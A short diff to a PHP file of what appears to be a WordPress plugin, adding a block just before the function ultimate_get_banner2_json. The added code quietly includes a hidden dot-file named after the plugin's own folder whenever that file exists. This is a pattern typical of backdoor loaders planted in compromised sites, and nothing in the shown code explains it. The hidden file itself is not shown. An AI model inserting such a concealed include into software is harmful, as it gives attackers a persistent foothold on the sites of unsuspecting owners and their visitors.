@@ -37,7 +37,11 @@ if ( ! function_exists( 'ultimate_get_icon_position_json' ) ) {
  * Function that display the banner in different styles.
  *
  * @method ultimate_get_banner2_json
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function ultimate_get_banner2_json() {
 	$json = '{
 		"Long_Text":{
